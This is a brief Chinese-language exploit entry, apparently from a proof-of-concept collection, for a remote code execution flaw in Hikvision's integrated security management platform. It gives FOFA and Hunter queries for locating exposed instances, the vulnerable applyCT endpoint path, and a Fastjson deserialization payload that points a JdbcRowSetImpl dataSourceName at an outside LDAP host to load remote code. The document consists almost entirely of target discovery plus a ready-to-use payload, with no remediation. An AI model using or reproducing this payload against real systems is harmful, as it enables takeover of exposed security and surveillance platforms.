# HiKVISION 综合安防管理平台 applyCT RCE漏洞

## 网络测绘

fofa: app="HIKVISION-综合安防管理平台"

hunter: app.name="Hikvision 海康威视 iSecure Center"

## POC / EXP

```
# URL
/bic/ssoService/v1/applyCT

# Payload
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnstunnel.run","autoCommit":true}}
```